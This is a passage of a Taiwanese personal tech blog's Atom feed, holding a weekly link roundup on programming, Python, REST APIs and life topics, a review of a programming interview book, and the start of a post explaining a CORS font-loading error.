&lt;li&gt;&lt;a href="https://twitter.com/JZdziarski/status/753640015108841472"&gt;Jonathan Zdziarski on Twitter: "Diffie-Hellman-Merkle: 💙 - 💙 Common Color  💛 - ❤️ + Secret Colors 💚 - 💜 = Mixture 💜 - 💚 &amp;lt; Swap 💛 - ❤️ + Secret Color ⚫️ - ⚫️ = Common Secret"&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://twitter.com/JZdziarski/status/753223642297892864"&gt;Jonathan Zdziarski on Twitter: "PKI / PGP Primer: 🔑 Public Key 🗝 Private Key 📝 Message  📝+🔑 = 🔒✉️ Encrypted 🔒✉️+🗝 = 🔓📝 Decrypted 📝+🗝 = 🔏✉️ Signed 🔏✉️ + 🔑 = 👤 Authenticated"&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Algorithm"></category><category term="Computer Science"></category></entry><entry><title>Y2016W36</title><link href="https://blog.m157q.tw/posts/2016/09/11/y2016w36/" rel="alternate"></link><published>2016-09-11T23:18:35+08:00</published><updated>2016-09-11T23:18:35+08:00</updated><author><name>M157q</name></author><id>tag:blog.m157q.tw,2016-09-11:posts/2016/09/11/y2016w36/</id><summary type="html">&lt;h3&gt;&lt;a href="http://www.arrc.tw/"&gt;ARRC (Advanced Rocket Research Center) （前瞻火箭計劃）&lt;/a&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://chinese.eurekalert.org/zh/pub_releases/2015-12/thkp-ppi121015.php"&gt;理大參與研發微型衛星平台及分離裝置&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;原來微型衛星跟普通衛星的重量可以差這麼多，一個是數公斤，一個是數百公斤。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://scitechvista.nat.gov.tw/zh-tw/articles/c/0/9/10/1/1646.htm"&gt;發射屬於自己的衛星 - 科技大觀園 - 科技部&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=7B9Up161sAI"&gt;台灣本土火箭 要讓太空旅行夢想成真 | 吳宗信 Jong-Shinn Wu | TEDxTaipei - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;用台語加英文演講真的超酷的啊，二十分鐘一下就聽完了，堅持 100% Made In Taiwan 真的很熱血啊。  &lt;/li&gt;
&lt;li&gt;五月天還為這件事寫了一首歌：&lt;a href="https://www.youtube.com/watch?v=YKiMrg6rgYQ"&gt;Mayday五月天 [ 頑固Tough ] Official Music Video - YouTube&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Blog&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://szlin.me/2016/08/15/%e8%87%aa%e7%94%b1%e9%96%8b%e6%ba%90%e8%bb%9f%e9%ab%94%e6%8e%88%e6%ac%8a%e5%8d%94%e8%ad%b0-open-source-license-%e5%80%8b%e4%ba%ba%e7%ad%86%e8%a8%98/"&gt;自由開源軟體授權協議 (Open source license) 個人筆記 – SZ Lin  &amp;amp; Embedded Linux&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;簡單的整理而已，沒有到很完整。我自己也一直沒有很熟悉各個授權之間的差異。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.s10g.tw/posts/2016/09/09/start-programming/"&gt;Solomon's Notebook – 如何轉換跑道去寫程式&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;遊戲真的讓好多人唸資工喔！做自己喜歡的事情真的是很棒的一件事啊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Cache&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://dbanotes.net/arch/five-minute_rule.html"&gt;关于 I/O 的五分钟法则(Five-Minute Rule) | DBA Notes 闲思录&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;所以是五分鐘內會被重複存取的就存到 cache，不知道公司之前的 memcache rule 設定成每 5 分鐘就清一次是不是這個原因？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.csdn.net/pennyliang/article/details/5903181"&gt;五分钟法则(five minute rules) - pennyliang的专栏 - 博客频道 - CSDN.NET&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Curl&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/356705/how-to-send-a-header-using-a-http-request-through-a-curl-call"&gt;How to send a header using a HTTP request through a curl call? - Stack Overflow&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;最近在公司接手了一個 RESTful API 的 repo，測試的時候需要改 HTTP request HEADER，用 Hackbar 無法改，用 Tamper Data 又太麻煩，還是用 curl 方便，就 &lt;code&gt;--header&lt;/code&gt; 就好了，也很直覺。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Dropbox&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://applehelpwriter.com/2016/07/28/revealing-dropboxs-dirty-little-security-hack/"&gt;revealing Dropbox’s dirty little security hack |&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;非常嚴重的漏洞，看到有人是建議先刪除 Dropbox 桌面版，等升到 macOS 以後再裝回 Dropbox，因為 macOS 的設計可以把這部份擋掉。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Game&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/jmechner/Prince-of-Persia-Apple-II"&gt;GitHub - jmechner/Prince-of-Persia-Apple-II: A running-jumping-swordfighting game I made on the Apple II from 1985-89&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Apple II 上風靡一時的波斯王子的原始碼，用 Assembly 寫的。重點是在於人物跑步的動作非常的流暢。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Interview&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.rowkey.me/blog/2015/12/31/dev-job-talk/"&gt;研发招聘之殇 - 后端技术杂谈 | 飒然Hang&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;算是作者面試許多人後給出的意見，我覺得滿中肯的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Soft_Job/M.1473255742.A.ED5.html"&gt;[心得] 台北多家面試心得 - 看板 Soft_Job - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇好多聽過的公司，但 web front-end 的薪水看來普遍還是偏低啊？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://thecodist.com/article/phone-interviews-can-be-so-painful-to-do"&gt;The Codist: Phone Interviews Can Be So Painful To Do&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇怨念超深，作者目前是迪士尼公司的 Lead iOS engineer，抱怨一堆來面試的人連一些很基本的問題都答不出來。雖然我不是 iOS developer 但要引以為戒啊...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Joke&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/28976652/answer/42804737"&gt;GitHub 是怎样的一个存在？ - Deep Reader 的回答 - 知乎&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;那個改圖真的是神靠北...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;K8s&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.infoworld.com/article/3118345/cloud-computing/why-kubernetes-is-winning-the-container-war.html"&gt;Why Kubernetes is winning the container war | InfoWorld&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Linux&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://linuxtoy.org/archives/linux-kernel-development-report-2016.html"&gt;Linux Kernel 开发报告 25 周年版 · LinuxTOY&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一些有趣的總結。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.linux.com/learn/elementary-os-loki-has-arrived"&gt;Elementary OS Loki Has Arrived | Linux.com | The source for Linux information&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;有用過 Elementary OS 一陣子，雖然抄 Mac 抄的很明顯，不過真的算是 UI 比較 friendly 的 Linux distro 了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Open Source&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://breezymove.blogspot.tw/2016/08/blog-post.html"&gt;風吹草動: 世上沒有免費的軟體，自由軟體亦如是（上）&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.gnu.org/philosophy/free-sw.en.html"&gt;You should think of 「free」 as in 「free speech,」 not as in 「free beer」&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;Free Software 的 Free 是自由而不是免費。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Profiling&lt;/h3&gt;
&lt;p&gt;這邊都還沒仔細看過，覺得 Profiling 又是另外一個大坑，但是很重要的大坑。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zapier.com/engineering/profiling-python-boss/"&gt;Profiling Python Like a Boss - The Zapier Engineering Blog - Zapier&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://julien.danjou.info/blog/2015/guide-to-python-profiling-cprofile-concrete-case-carbonara"&gt;Profiling Python using cProfile: a concrete case | Julien Danjou&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.ionelmc.ro/2013/06/08/python-profiling-tools/"&gt;Python profiling tools | ionel's codelog&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/3.5/library/profile.html"&gt;27.4. The Python Profilers — Python 3.5.2 documentation&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.huyng.com/posts/python-performance-analysis"&gt;A guide to analyzing Python performance « Huy Nguyen&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/582336/how-can-you-profile-a-python-script"&gt;performance - How can you profile a Python script? - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Programmer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://mp.weixin.qq.com/s?__biz=MzI0NzIwNDgzNg%3D%3D&amp;amp;mid=2649759701&amp;amp;idx=1&amp;amp;sn=c28214d95f6254ac2f1772aaa181f9f2&amp;amp;scene=2&amp;amp;srcid=0908TIsIeCZ7LjLXYIvnZMn2"&gt;谁说程序员不是潜力股？让这位世界前五名的天才程序员来颠覆你三观！&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;「世界上最大的程序员同性交友网站」GitHub  &lt;/li&gt;
&lt;li&gt;本週看到最勵志的文章。介紹的是一個知名的 Python developer，他最著名的 project 就是寫過 Python 應該都聽過的 &lt;a href="https://github.com/kennethreitz/requests"&gt;requests&lt;/a&gt;，沒想到他曾是個肥宅，真是太激勵人心了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Programming&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://eev.ee/blog/2016/07/26/the-hardest-problem-in-computer-science/"&gt;The hardest problem in computer science / fuzzy notepad&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;巴別塔。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.wildsky.cc/posts/the-art-of-readable-code/"&gt;【筆記】易讀程式之美學 – 提升程式碼可讀性的簡單法則 (The Art of Readable Code) | Wildsky's wild sky&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;前陣子也有買這本，但還沒看。技術書大概是唯一一種最希望被其他人雷的書了吧。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Python&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://pylint.readthedocs.io/en/latest/intro.html"&gt;Introduction — Pylint 2.0.0 documentation&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一個幫忙檢查 Python code 的工具，包含 error 還有 coding style 等等。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/PyCQA/pylint"&gt;GitHub - PyCQA/pylint: A Python source code analyzer which looks for programming errors, helps enforcing a coding standard and sniffs for some code smells&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://bugs.python.org/issue27350"&gt;Issue 27350: Compact and ordered dict - Python tracker&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;似乎確定要在 Python 3.6 加入這個 compact ordered dict 了，詳細還不是很瞭解怎麼用。  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://morepypy.blogspot.tw/2015/01/faster-more-memory-efficient-and-more.html"&gt;PyPy Status Blog: Faster, more memory efficient and more ordered dictionaries on PyPy&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/sylnsfar/qrcode"&gt;GitHub - sylnsfar/qrcode: artistic QR Code in Python （Animated GIF qr code）- Python 艺术二维码生成器 （GIF动态二维码、图片二维码）&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;誒 這好酷炫喔！之後有需要可能會拿來用用 XD  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;pip install myqr&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Restful&lt;/h3&gt;
&lt;p&gt;最近要開發一個 RESTful API 出來，所以查了一些相關的資源。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/AmigoChan/restful-api-design"&gt;RESTful API Design&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.dj1020.net/%E7%9C%9F%E3%80%82%E6%B7%BA%E8%AB%87_RESTful_API_by_Triton_Ho/"&gt;真。淺談 RESTful API by Triton Ho | 閃亮亮大師之路&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.ruanyifeng.com/blog/2014/05/restful_api.html"&gt;RESTful API 设计指南 - 阮一峰的网络日志&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/nicolaiarocci/eve"&gt;GitHub - nicolaiarocci/eve: Simple REST APIs&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;based on flask 的 framework，感覺好像也還不錯，以後有機會可能可以用用看。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.miguelgrinberg.com/post/designing-a-restful-api-with-python-and-flask"&gt;Designing a RESTful API with Python and Flask - miguelgrinberg.com&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.slideshare.net/RyanMorlok/restful-app-engine"&gt;Restful App Engine&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Representational_state_transfer"&gt;Representational state transfer - Wikipedia, the free encyclopedia&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Web&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.rowkey.me/blog/2016/08/27/server-basic-tech-stack/"&gt;谈谈互联网后端基础设施 - 后端技术杂谈 | 飒然Hang&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇真的寫的很棒，作者把各個部份講的很詳細，看了一下他其他的文章也都覺得滿不錯，雖然是以 Java 為主，但之後有空應該會再看看他部落格的文章。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Work&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://jvns.ca/blog/2016/08/16/how-do-you-work-on-something-important/"&gt;How do you decide what to work on? - Julia Evans&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這篇真的是寫程式開始工作以後會遇到的事，心有戚戚焉。老闆只會開一堆他想做的事情要你完成，至於評估可行性及如何完成完全就是自己要面對的事。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Ptt&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/Japan_Travel/M.1386355632.A.851.html"&gt;[分享] 買廉價航空機票前你應該先知道的事 - 看板 Japan_Travel - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;沒搭過廉航，看這篇長知識。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/MuscleBeach/M.1473070754.A.646.html"&gt;[閒聊] 我要成為今年最狂的新娘！ - 看板 MuscleBeach - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這新娘的肌肉真的超壯...  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/C_Chat/M.1473011847.A.083.html"&gt;[閒聊] EVA廚辦婚禮會是什麼樣子？(9/3宴客) - 看板 C_Chat - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;真的是超級 Eva 迷 XDDD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Life&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=cNTKoe3G9Qo&amp;amp;feature=youtu.be"&gt;papi酱 - 小学一年级到大四毕业 16年学生生涯经典语录120句 - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;看來大學之前的生活內容跟臺灣差不多耶，感覺都一樣填鴨。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="http://pansci.asia/archives/105418"&gt;粉刺處理全攻略！A 酸、杜鵑花酸、杏仁酸跟果酸你分得清楚嗎？ - PanSci 泛科學&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;長知識文，但原來粉刺用擠的或用拔的都不行嗎？  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Trivia&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.dailycold.tw/11464/%E7%A4%A6%E6%B3%89%E6%B0%B4%E7%82%BA%E4%BB%80%E9%BA%BC%E6%9C%89%E4%BF%9D%E5%AD%98%E6%9C%9F%E9%99%90%EF%BC%9F/"&gt;礦泉水為什麼有保存期限？ – 每日一冷 – 你的冷知識入口&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;長知識，原來保存期限是因為容器而不是水啊。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Curl"></category><category term="Linux"></category><category term="Youtube"></category><category term="Life"></category><category term="Programming"></category><category term="Work"></category><category term="ARRC"></category><category term="Ptt"></category><category term="GitHub"></category><category term="Restful"></category><category term="Web"></category><category term="Dropbox"></category><category term="Profiling"></category><category term="Blog"></category><category term="Open Source"></category><category term="Python"></category><category term="Programmer"></category><category term="Interview"></category><category term="Cache"></category><category term="K8s"></category><category term="Trivia"></category></entry><entry><title>《程序員面試攻略》第三版（簡中）</title><link href="https://blog.m157q.tw/posts/2016/09/09/programming-interviews-exposed-third-edition/" rel="alternate"></link><published>2016-09-09T12:40:59+08:00</published><updated>2016-09-09T12:40:59+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-09-09:posts/2016/09/09/programming-interviews-exposed-third-edition/</id><summary type="html">&lt;p&gt;&lt;img alt="front cover" src="/files/programming-interviews-exposed-third-edition/front_cover.jpg" /&gt;&lt;br /&gt;
&lt;img alt="back cover" src="/files/programming-interviews-exposed-third-edition/back_cover.jpg" /&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;又是一本買了很久才看完的書，&lt;br /&gt;
這本書沒記錯的話應該是大學還沒畢業的時候就買了。&lt;br /&gt;
應該是大四的時候，&lt;br /&gt;
逛清大對面的若水堂看到這本，&lt;br /&gt;
翻了一下覺得內容還不錯就買了。  &lt;/p&gt;
&lt;p&gt;直到去年準備要找工作的時候才開始看，&lt;br /&gt;
仍舊是用我那龜速的看速度。&lt;br /&gt;
我印象最深的就是去年底跑去台南的時候也帶著這本書在看，&lt;br /&gt;
jserv 安排了一天三場分別由 MediaTek, Google, Facebook 的工程師演講那天，&lt;br /&gt;
中午聚餐吃完飯在等待的時間拿出來看，&lt;br /&gt;
然後就被 jserv 嗆：  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;不要再看什麼書了啦，&lt;br /&gt;
裝什麼認真，&lt;br /&gt;
旁邊有這麼多強者現場就可以問，&lt;br /&gt;
還不趕快去找他們聊天，&lt;br /&gt;
有什麼想問的就趕快問，&lt;br /&gt;
這是書上學不到的經驗，&lt;br /&gt;
書自己找時間再看就好啦，&lt;br /&gt;
懂嗎？  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;直到現在猶如當頭棒喝。  &lt;/p&gt;
&lt;p&gt;然後這本書在我找到工作後就這麼擱著，&lt;br /&gt;
直到最近才又拿出來閱讀，&lt;br /&gt;
然後在上個月 25 號讀完了。&lt;br /&gt;
至於為什麼會拿出來看，&lt;br /&gt;
那又是另外一個故事了。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;紀錄&lt;/h2&gt;
&lt;p&gt;我覺得這本書大略可以分成 3 個部份：  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;第 0~3 章  &lt;ul&gt;
&lt;li&gt;介紹求職應該有什麼樣的心態、注意事項以及面試時回答問題和談薪水的技巧。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;第 4~13 章  &lt;ul&gt;
&lt;li&gt;基本的資訊學科相關問題，包含：Linked List, Tree, Graph, Array, String, Recursion, Sorting, Concurrency, Object-Oriented, Design Pattern, Database, Bitwise operation.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;第 14~17 章和附錄  &lt;ul&gt;
&lt;li&gt;一些估算與智力測驗相關還有非技術性的問題（為了瞭解人格特質是否適合團隊）。然後附錄是如何撰寫 Resume 的範例，有給出改過前後的對比以及講說大概要怎麼寫。  &lt;/li&gt;
&lt;li&gt;但第 16 章又回到比較技術性的問題，主要是在做一些名詞解釋以及比較的問答。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;之前是看到 Sorting 的部份，&lt;br /&gt;
最近才從 Concurrency 的部份繼續看完。&lt;br /&gt;
個人覺得裡頭提到的技術相關問題真的都算蠻基本的題目，&lt;br /&gt;
畢竟也沒有深入到問些 Operating System, Computer Architecture, Compiler 底層實作和效能比較相關的問題，&lt;br /&gt;
至於第 16 章針對各種不同的名詞解釋並比較其優缺點，&lt;br /&gt;
列出來的內容也算蠻基本的，&lt;br /&gt;
我覺得也算是面試中常常會被問到的問題。  &lt;/p&gt;
&lt;p&gt;然後我自己覺得收穫比較多的應該算是一些非技術性的部份，&lt;br /&gt;
像是第一部份提到的，&lt;br /&gt;
關於找工作的心態、談薪水的技巧、解程式問題時的思路還有該如何跟面試官討論等等，&lt;br /&gt;
還有第三部份講到一些智力測驗問題的估算還有人格特質會影響拿不拿得到 offer 等等。  &lt;/p&gt;
&lt;p&gt;至於附錄的履歷撰寫部份，&lt;br /&gt;
因為之前找工作的時候有紀錄了一篇 &lt;a href="/posts/2016/01/22/how-to-write-a-resume-for-programming-jobs/"&gt;程式設計師的履歷撰寫要點&lt;/a&gt;，&lt;br /&gt;
個人覺得講的差不多，&lt;br /&gt;
所以就沒有細看。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;p&gt;這本書我覺得無法拿來準備些技術性比較深的面試，&lt;br /&gt;
然後偏 Web front-end 跟 App 開發的人可能也比較不太適合看這本書，&lt;br /&gt;
因為很多東西可能不需要用到，&lt;br /&gt;
但就看面試的公司會出什麼樣的題目吧。&lt;br /&gt;
（前陣子也是看到一堆美國的公司在找網頁前端開發人員要考演算法、資料結構的）  &lt;/p&gt;
&lt;p&gt;至於比較偏 Operation System, Computer Architecture, Compiler 這塊的人，&lt;br /&gt;
看這本書的技術性相關的部份應該會覺得非常簡單，&lt;br /&gt;
所以比較有收穫的應該會是關於非技術性的面試技巧的部份吧。  &lt;/p&gt;
&lt;p&gt;總之這本書我最近應該會再快速翻閱一次就是。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;所以結論是這本書大概就是給我這種基礎學科沒學好的人來複習用的 (?)  &lt;/p&gt;
&lt;/blockquote&gt;</summary><category term="Interview"></category><category term="Programming Job"></category></entry><entry><title>紀錄一下和 CORS (Cross-Origin Resource Sharing) 有關的問題</title><link href="https://blog.m157q.tw/posts/2016/09/07/cross-origin-resource-sharing/" rel="alternate"></link><published>2016-09-07T23:22:28+08:00</published><updated>2016-09-07T23:22:28+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-09-07:posts/2016/09/07/cross-origin-resource-sharing/</id><summary type="html">&lt;h2&gt;Situation&lt;/h2&gt;
&lt;p&gt;錯誤訊息長的像下面這樣  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Font from origin &amp;#39;http://cdn.xxx.xxx&amp;#39;  
has been blocked from loading by Cross-Origin Resource Sharing policy:  
No &amp;#39;Access-Control-Allow-Origin&amp;#39; header is present on the requested resource.  
Origin &amp;#39;http://ooo.xxx.xxx&amp;#39; is therefore not allowed access.  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;這是以前沒遇過的問題，&lt;br /&gt;
所以尋找了一下答案，&lt;br /&gt;
紀錄起來，&lt;br /&gt;
給自己備忘。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;What is CORS?&lt;/h2&gt;
&lt;h3&gt;CORS is the abbreviation of "Cross-Origin Resource Sharing".&lt;/h3&gt;
&lt;h4&gt;1. &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS#Access-Control-Allow-Origin"&gt;HTTP access control (CORS) - HTTP | MDN&lt;/a&gt;&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;For security reasons, browsers restrict cross-origin HTTP requests initiated from within scripts. For example, XMLHttpRequest follows the same-origin policy. So, a web application using XMLHttpRequest could only make HTTP requests to its own domain. To improve web applications, developers asked browser vendors to allow XMLHttpRequest to make cross-domain requests.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The W3C Web Applications Working Group recommends the new Cross-Origin Resource Sharing (CORS) mechanism. CORS gives web servers cross-domain access controls, which enable secure cross-domain data transfers. Modern browsers use CORS in an API container - such as XMLHttpRequest - to mitigate risks of cross-origin HTTP requests.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;簡單來說就是 XMLHttpRequest 因為安全性的考量只允許相同域名的請求，&lt;br /&gt;
如果要請求跨域名的物件的話，&lt;br /&gt;
就必須請目標域名的管理者把自己加到該目標域名網站的 &lt;code&gt;Access-Control-Allow-Origin&lt;/code&gt; 的 HTTP Header 中，&lt;br /&gt;
而 CORS 就是為了解決這件事而出現。  &lt;/p&gt;
&lt;h4&gt;2. &lt;a href="https://cloud.google.com/storage/docs/cross-origin#client_side_support"&gt;Cross-Origin Resource Sharing (CORS) | Cloud Storage | Google Cloud Platform&lt;/a&gt;&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The same-origin policy is a security policy enforced on client-side web apps (e.g., web browsers) to prevent interactions between resources from different origins. While useful for preventing malicious behavior, this security measure also prevents useful and legitimate interactions between known origins. For example, a script on a page hosted from Google App Engine at example.appspot.com might want to use static resources stored in a Cloud Storage bucket at example.storage.googleapis.com. However, because these are two different origins from the perspective of the browser, the browser won't allow a script from example.appspot.com to fetch resources from example.storage.googleapis.com using XMLHttpRequest because the resource being fetched is from a different origin.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The Cross Origin Resource Sharing (CORS) spec was developed by the World Wide Web Consortium (W3C) to get around this limitation.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;大意其實跟上面那段差不多。  &lt;/p&gt;
